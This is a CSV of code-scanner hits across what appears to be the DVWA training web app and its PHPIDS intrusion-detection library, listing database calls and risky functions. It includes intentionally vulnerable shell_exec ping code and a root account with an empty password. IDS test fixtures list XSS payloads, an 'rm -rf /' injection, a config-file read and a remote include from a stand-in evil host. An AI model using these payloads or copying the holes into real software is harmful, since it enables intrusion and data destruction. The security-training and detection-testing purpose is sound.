"file_type","file","line_number","match","name","snippet","group"
"php","./dvwa/includes/DBMS/MySQL.php","5","database","database","2-3-/*4-5:This file contains all of the code to setup the initial MySQL database. (setup.php)6-7-*/8-9-if( !@mysql_connect( $_DVWA[ 'db_server' ], $_DVWA[ 'db_user' ], $_DVWA[ 'db_password' ] ) ) {10:	dvwaMessagePush( ""Could not connect to the database - please check the config file."" );11-	dvwaPageReload();12-}13-14:// Create database15-$drop_db = ""DROP DATABASE IF EXISTS dvwa;"";16-if( !@mysql_query ( $drop_db ) ) {17:	dvwaMessagePush( ""Could not drop existing database<br />SQL: "".mysql_error() );18-	dvwaPageReload();19-}20-21-$create_db = ""CREATE DATABASE dvwa;"";22-23-if( !@mysql_query ( $create_db ) ) {24:	dvwaMessagePush( ""Could not create database<br />SQL: "".mysql_error() );25-	dvwaPageReload();26-}27-28-dvwaMessagePush( ""Database has been created."" );29-30-// Create table 'users'31:if( !@mysql_select_db( $_DVWA[ 'db_database' ] ) ) {32:	dvwaMessagePush( 'Could not connect to database.' );33-	dvwaPageReload();34-}35-","custom_strings"
"php","./dvwa/includes/dvwaPage.inc.php","526","database","database","523-524-$DBMS_connError = '<div align=""center"">525-		<img src=""'.DVWA_WEB_PAGE_TO_ROOT.'dvwa/images/logo.png"">526:		<pre>Unable to connect to the database.<br>'.$DBMS_errorFunc.'<br /><br /></pre>527:		Click <a href=""'.DVWA_WEB_PAGE_TO_ROOT.'setup.php"">here</a> to setup the database.528-		</div>';529-530-function dvwaDatabaseConnect() {","custom_strings"
"php","./dvwa/includes/dvwaPage.inc.php","539","database","database","536-	if ($DBMS == 'MySQL') {537-538-		if( !@mysql_connect( $_DVWA[ 'db_server' ], $_DVWA[ 'db_user' ], $_DVWA[ 'db_password' ] )539:		|| !@mysql_select_db( $_DVWA[ 'db_database' ] ) ) {540-			die( $DBMS_connError );541-		}542-","custom_strings"
"php","./dvwa/includes/dvwaPage.inc.php","547","database","database","544-	545-	elseif ($DBMS == 'PGSQL') {546-547:		$dbconn = pg_connect(""host="".$_DVWA[ 'db_server' ]."" dbname="".$_DVWA[ 'db_database' ]."" user="".$_DVWA[ 'db_user' ]."" password="".$_DVWA[ 'db_password' ])548-		or die( $DBMS_connError );549-550-	}","custom_strings"
"php","./config/config.inc.php","3","database","database","1-<?php2-3:# If you are having problems connecting to the MySQL database and all of the variables below are correct4-# try changing the 'db_server' variable from localhost to 127.0.0.1. Fixes a problem due to sockets.5-# Thanks to digininja for the fix.6-","custom_strings"
"php","./config/config.inc.php","16","database","database","13-14-$_DVWA = array();15-$_DVWA[ 'db_server' ] = 'localhost';16:$_DVWA[ 'db_database' ] = 'dvwa';17-$_DVWA[ 'db_user' ] = 'root';18-$_DVWA[ 'db_password' ] = '';19-","custom_strings"
"php","./setup.php","21","database","database","18-		include_once DVWA_WEB_PAGE_TO_ROOT.'dvwa/includes/DBMS/PGSQL.php';19-	}20-	else {21:		dvwaMessagePush( ""ERROR: Invalid database selected. Please review the config file syntax."" );22-		dvwaPageReload();23-	}24-","custom_strings"
"php","./setup.php","32","database","database","29-<div class=\""body_padded\"">30-	<h1>Database setup <img src=\"""".DVWA_WEB_PAGE_TO_ROOT.""dvwa/images/spanner.png\""></h1>31-32:	<p>Click on the 'Create / Reset Database' button below to create or reset your database. If you get an error make sure you have the correct user credentials in /config/config.inc.php</p>33-34:	<p>If the database already exists, it will be cleared and the data will be reset.</p>35-36-	<br />37-","custom_strings"
"php","./external/phpids/0.6/docs/examples/example.php","113","eval(","eval(","111-112-    } else {113:        echo '<a href=""?test=%22><script>eval(window.name)</script>"">No attack detected - click for an example attack</a>';114-    }115-} catch (Exception $e) {116-    /*","dangerous_functions"
"php","./external/phpids/0.6/tests/IDS/MonitorTest.php","409","eval(","eval(","406-                        default xml namespace=toolbar,y=1&&name407-                        default xml namespace=toolbar408-                        default xml namespace=e(y)';409:        $exploits[] = '-Infinity++in eval(1&&name)';410-        $exploits[] = 'new Array, new Array, new Array, new Array, new Array, new Array, new Array, new Array, new Array, new Array, new Array, new Array,411-                        x=(\'e\')412-                        x=(\'nam\')+(new Array)+x","dangerous_functions"
"php","./external/phpids/0.6/tests/IDS/MonitorTest.php","475","eval(","eval(","472-473-        $exploits = array();474-        $exploits[] = ""/*@cc_on@set@x=88@set@ss=83@set@s=83@*/@cc_on alert(String.fromCharCode(@x,@s,@ss))"";475:        $exploits[] = ""@cc_on eval(@cc_on name)"";476-        $exploits[] = ""@if(@_mc680x0)@else alert(@_jscript_version)@end"";477-        $exploits[] = ""\""\""@cc_on,x=@cc_on'something'@cc_on"";478-","dangerous_functions"
"php","./external/phpids/0.6/tests/IDS/MonitorTest.php","492","eval(","eval(","489-    public function testXSSList() {490-491-        $exploits = array();492:        $exploits[] = '\'\'""--><script>eval(String.fromCharCode(88,83,83)));%00';493-        $exploits[] = '""></a style=""xss:ex/**/pression(alert(1));""';494-        $exploits[] = 'top.__proto__._= alert495-                       _(1)';","dangerous_functions"
"php","./external/phpids/0.6/tests/IDS/MonitorTest.php","519","eval(","eval(","516-        $exploits[] = ""e=1..eval517-                        e(e(\""\u200fname\""),e)"";518-        $exploits[] = ""<x///style=-moz-\&#x362inding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)>"";519:        $exploits[] = ""a//a'\u000aeval(name)"";520:        $exploits[] = ""a//a';eval(name)"";521-        $exploits[] = ""(x) setter=0?0.:alert,x=0"";522-        $exploits[] = ""y=('na') + new Array +'me'523-                        y","dangerous_functions"
"php","./external/phpids/0.6/tests/IDS/MonitorTest.php","580","eval(","eval(","577-        $exploits[] = 'a=eval,b= [ referrer ] ;a(b)';578-        $exploits[] = ""URL = ! isNaN(1) ? 'javascriptz:zalertz(1)z' [/replace/ [ 'source' ] ]579-                        (/z/g, [] ) : 0"";580:        $exploits[] = ""if(0){} else eval(new Array + ('eva') + new Array + ('l(n') + new Array + ('ame) + new Array') + new Array)581-                        'foo bar foo bar foo'"";582:        $exploits[] = ""switch('foo bar foo bar foo bar') {case eval(new Array + ('eva') + new Array + ('l(n') + new Array + ('ame) + new Array') + new Array):}"";583-        $exploits[] = ""xxx='javascr',xxx+=('ipt:eva'),xxx+=('l(n'),xxx+=('ame),y')584-                        Cen:tri:fug:eBy:pas:sTe:xt:do location=(xxx)585-                        while(0)","dangerous_functions"
"php","./external/phpids/0.6/tests/IDS/MonitorTest.php","1073","eval(","eval(","1070-1071-        $exploits = array();1072-        $exploits[] = '+alert(1)';1073:        $exploits[] = 'ACM=1,1+eval(1+name+(+ACM-1),ACM)';1074:        $exploits[] = '1+eval(1+name+(+1-1),-1)';1075-        $exploits[] = 'XSS without being noticed<a/href=da&#x74&#97:text/html&#59&#x63harset=UTF-7&#44+ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAxACkAPAAvAHMAYwByAGkAcAB0AD4->test';1076-1077-        $this->_testForPlainEvent($exploits);","dangerous_functions"
"php","./external/phpids/0.6/tests/IDS/MonitorTest.php","1272","eval(","eval(","1269-    public function testJSONScanning() {1270-1271-        $exploits = array();1272:        $exploits['json_1'] = '{""a"":""b"",""c"":[""><script>alert(1);</script>"", 111, ""eval(name)""]}';1273-        $test = new IDS_Monitor(1274-            $exploits,1275-            $this->init","dangerous_functions"
"php","./external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/VarParser/Native.php","17","eval(","eval(","14-    15-    protected function evalExpression($expr) {16-        $var = null;17:        $result = eval(""\$var = $expr;"");18-        if ($result === false) {19-            throw new HTMLPurifier_VarParserException(""Fatal error in evaluated code"");20-        }","dangerous_functions"
"php","./external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/ConfigSchema/InterchangeBuilder.php","140","eval(","eval(","137-     * Evaluates an array PHP code string without array() wrapper138-     */139-    protected function evalArray($contents) {140:        return eval('return array('. $contents .');');141-    }142-    143-    /**","dangerous_functions"
"php","./security.php","96","eval(","eval(","93-	<p>You can enable PHPIDS across this site for the duration of your session.</p>94-95-	<p>{$phpIdsHtml}</p>96:	[<a href=\""?test=%22><script>eval(window.name)</script>\"">Simulate attack</a>] -97-	[<a href=\""ids_log.php\"">View IDS log</a>]98-	99-</div>","dangerous_functions"
"php","./vulnerabilities/exec/source/medium.php","18","exec(","exec(","16-	if (stristr(php_uname('s'), 'Windows NT')) { 17-	18:		$cmd = shell_exec( 'ping  ' . $target );19-		$html .= '<pre>'.$cmd.'</pre>';20-		21-	} else { 22-	23:		$cmd = shell_exec( 'ping  -c 3 ' . $target );24-		$html .= '<pre>'.$cmd.'</pre>';25-		26-	}","dangerous_functions"
"php","./vulnerabilities/exec/source/low.php","10","exec(","exec(","7-	// Determine OS and execute the ping command.8-	if (stristr(php_uname('s'), 'Windows NT')) { 9-	10:		$cmd = shell_exec( 'ping  ' . $target );11-		$html .= '<pre>'.$cmd.'</pre>';12-		13-	} else { 14-	15:		$cmd = shell_exec( 'ping  -c 3 ' . $target );16-		$html .= '<pre>'.$cmd.'</pre>';17-		18-	}","dangerous_functions"
"php","./vulnerabilities/exec/source/high.php","23","exec(","exec(","20-		// Determine OS and execute the ping command.21-		if (stristr(php_uname('s'), 'Windows NT')) { 22-	23:			$cmd = shell_exec( 'ping  ' . $target );24-			$html .= '<pre>'.$cmd.'</pre>';25-		26-		} else { 27-	28:			$cmd = shell_exec( 'ping  -c 3 ' . $target );29-			$html .= '<pre>'.$cmd.'</pre>';30-		31-		}","dangerous_functions"
"php","./external/phpids/0.6/tests/IDS/MonitorTest.php","238","exec(","exec(","235-        $exploits[] = 'b=(navigator);c=(b.userAgent);d=c[61]+c[49]+c[6]+c[4];e=\'\'+/abcdefghijklmnopqrstuvwxyz.(1)/;f=e[12]+e[15]+e[3]+e[1]+e[20]+e[9]+e[15]+e[14]+e[27]+e[8]+e[1]+e[19]+e[8]+e[27]+e[19]+e[21]+e[2]+e[19]+e[20]+e[18]+e[9]+e[14]+e[7]+e[28]+e[29]+e[30];0[\'\'+[d]](0[\'\'+(d)](f));';236-        $exploits[] = ""c4=1==1&&'(1)';c3=1==1&&'aler';c2=1==1&&':';c1=1==1&&'javascript';a=c1+c2+c3+'t'+c4;(URL=a);"";237-        $exploits[] = ""x=''+/abcdefghijklmnopqrstuvwxyz.(1)/;e=x[5];v=x[22];a=x[1];l=x[12];o=x[15];c=x[3];t=x[20];i=x[9];n=x[14];h=x[8];s=x[19];u=x[21];b=x[2];r=x[18];g=x[7];dot=x[27];uno=x[29];op=x[28];cp=x[30];z=e+v+a+l;y=l+o+c+a+t+i+o+n+dot+h+a+s+h+dot+s+u+b+s+t+r+i+n+g+op+uno+cp;0[''+[z]](0[''+(z)](y));"";238:        $exploits[] = ""d=''+/eval~locat~ion.h~ash.su~bstring(1)/;e=/.(x?.*)~(x?.*)~(x?.*)~(x?.*)~(x?.*)./;f=e.exec(d);g=f[2];h=f[3];i=f[4];j=f[5];k=g+h+i+j;0[''+(f[1])](0[''+(f[1])](k));"";239-        $exploits[] = ""a=1!=1?/x/:'eva';b=1!=1?/x/:'l';a=a+b;e=1!=1?/x/:'h';b=1!=1?/x/:'locatio';c=1!=1?/x/:'n';d=1!=1?/x/:'.has';h=1!=1?/x/:'1)';g=1!=1?/x/:'ring(0';f=1!=1?/x/:'.subst';b=b+c+d+e+f+g+h;B=00[''+[a]](b);00[''+[a]](B);"";240-        $exploits[] = ""(z=String)&&(z=z() );{a=(1!=1)?a:'eva'+z}{a+=(1!=1)?a:'l'+z}{b=(1!=1)?b:'locatio'+z}{b+=(1!=1)?b:'n.has'+z}{b+=(1!=1)?b:'h.subst'+z}{b+=(1!=1)?b:'r(1)'+z}{c=(1!=1)?c:(0)[a]}{d=c(b)}{c(d)}"";241-        $exploits[] = ""{z=(1==4)?here:{z:(1!=5)?'':be}}{y=(9==2)?dragons:{y:'l'+z.z}}{x=(6==5)?3:{x:'a'+y.y}}{w=(5==8)?9:{w:'ev'+x.x}}{v=(7==9)?3:{v:'tr(2)'+z.z}}{u=(3==8)?4:{u:'sh.subs'+v.v}}{t=(6==2)?6:{t:y.y+'ocation.ha'+u.u}}{s=(4==3)?3:{s:(8!=3)?(2)[w.w]:z}}{r=s.s(t.t)}{s.s(r)+z.z}"";","dangerous_functions"
"php","./external/phpids/0.6/tests/IDS/MonitorTest.php","1012","exec(","exec(","1009-        $exploits = array();1010-        $exploits[] = ';phpinfo()';1011-        $exploits[] = '@phpinfo()';1012:        $exploits[] = '""; <?php exec(""rm -rf /""); ?>';1013-        $exploits[] = '; file_get_contents(\'/usr/local/apache2/conf/httpd.conf\');';1014-        $exploits[] = ';echo file_get_contents(implode(DIRECTORY_SEPARATOR, array(""usr"",""local"",""apache2"",""conf"",""httpd.conf""))';1015-        $exploits[] = '; include ""http://evilsite.com/evilcode""';","dangerous_functions"
"php","./external/phpids/0.6/lib/IDS/Log/File.php","197","fclose(","fclose(","195-                        $handle = fopen($this->logfile, 'a');196-                        fwrite($handle, trim($data) . ""\n"");197:                        fclose($handle);198-199-                    } else {200-                        throw new Exception(","dangerous_functions"
"php","./external/phpids/0.6/lib/IDS/Log/Email.php","244","fclose(","fclose(","241-        if (!file_exists($file)) {242-            $handle = fopen($file, 'w');243-            fwrite($handle, time());244:            fclose($handle);245-246-            return false;247-        }","dangerous_functions"
"php","./external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/StringHashParser.php","41","fclose(","fclose(","38-        $fh = fopen($file, 'r');39-        if (!$fh) return false;40-        $ret = $this->parseHandle($fh);41:        fclose($fh);42-        return $ret;43-    }44-","dangerous_functions"
"php","./external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/StringHashParser.php","56","fclose(","fclose(","53-        while (!feof($fh)) {54-            $ret[] = $this->parseHandle($fh);55-        }56:        fclose($fh);57-        return $ret;58-    }59-","dangerous_functions"
"php","./external/phpids/0.6/lib/IDS/Caching/File.php","149","fclose(","fclose(","146-            }147-            148-            fwrite($handle, serialize($data));149:            fclose($handle);150-        }151-152-        return $this;","dangerous_functions"
"php","./external/phpids/0.6/lib/IDS/Caching/Memcached.php","154","fclose(","fclose(","151-152-        if (!file_exists($this->path)) {153-            $handle = fopen($this->path, 'w');154:            fclose($handle);155-        }156-157-        if (!is_writable($this->path)) {","dangerous_functions"
"php","./dvwa/includes/dvwaPhpIds.inc.php","47","fclose(","fclose(","44-function dvwaClearIdsLog()	{45-	if (isset($_GET['clear_log'])) { 46-		$fp = fopen(DVWA_WEB_PAGE_TO_PHPIDS_LOG, w);47:		fclose($fp);48-		dvwaMessagePush( ""PHPIDS log cleared"" );49-		dvwaPageReload();50-	}","dangerous_functions"
"php","./vulnerabilities/upload/source/medium.php","13","file(","file(","11-12-13:				if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {14-				15-					$html .= '<pre>';16-					$html .= 'Your image was not uploaded.';","dangerous_functions"
